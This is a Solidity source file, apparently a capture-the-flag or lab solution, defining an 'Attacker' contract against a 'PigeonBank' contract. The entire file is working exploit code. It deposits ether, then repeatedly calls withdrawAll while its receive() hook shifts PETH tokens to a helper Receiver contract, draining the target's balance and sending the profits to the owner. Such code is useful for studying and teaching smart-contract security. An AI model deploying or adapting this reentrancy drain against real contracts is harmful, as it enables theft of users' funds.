// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";
import "./Receiver.sol";

contract Attacker
{
    PigeonBank public pigeonBank;
    PETH public peth;
    Receiver public receiver;
    address public owner;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        peth = PETH(pigeonBank.peth());
        owner = msg.sender;
        receiver = new Receiver(_pigeonBankAddress);
    }

    function attack() public payable {
        //First we deposti our 10eth
        pigeonBank.deposit{value: 10 ether}();

        //Now we abuse the bug 250 times to get all the money out of the contract.
        while(address(peth).balance > 0) {
            //Call the withdraw function
            pigeonBank.withdrawAll();

            //Call the giveMyMoneysBack function to get the tokens out of the receiver contract
            receiver.giveMyMoneysBack();
        }

        //Send all the profits to the owner
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        //Move the tokens to our receiver contract to not burn them
        peth.transfer(address(receiver), 10 ether);
    }
}